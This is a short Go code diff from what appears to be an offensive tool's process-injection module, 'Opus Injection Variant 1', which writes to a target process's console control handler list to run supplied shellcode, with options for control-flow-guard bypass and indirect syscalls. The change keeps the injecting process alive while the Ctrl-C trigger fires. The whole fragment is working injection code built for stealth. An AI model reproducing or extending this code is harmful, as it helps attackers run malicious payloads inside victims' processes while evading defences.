@@ -122,9 +122,13 @@ func executeOpusVariant1(shellcode []byte, pid uint32, cfgBypass bool) (string, 
 	sb.WriteString(fmt.Sprintf("[+] Updated HandlerListLength: %d -> %d\n", handlerCount, newCount))
 
 	// Step 10: Attach to target console and trigger
+	// Ignore Ctrl-C in our own process so GenerateConsoleCtrlEvent doesn't kill us
+	procSetConsoleCtrlHandler.Call(0, 1)
+
 	procFreeConsole.Call()
 	ret, _, attachErr := procAttachConsole.Call(uintptr(pid))
 	if ret == 0 {
+		procSetConsoleCtrlHandler.Call(0, 0)
 		// Restore handler count
 		oldCountBytes := (*[4]byte)(unsafe.Pointer(&handlerCount))[:]
 		injectWriteMemory(hProcess, handlerListLengthAddr, oldCountBytes)
@@ -143,6 +147,8 @@ func executeOpusVariant1(shellcode []byte, pid uint32, cfgBypass bool) (string, 
 
 	procFreeConsole.Call()
 	procAllocConsole.Call()
+	// Restore Ctrl-C handling
+	procSetConsoleCtrlHandler.Call(0, 0)
 
 	if IndirectSyscallsAvailable() {
 		sb.WriteString("[+] Opus Injection Variant 1 completed (indirect syscalls)\n")
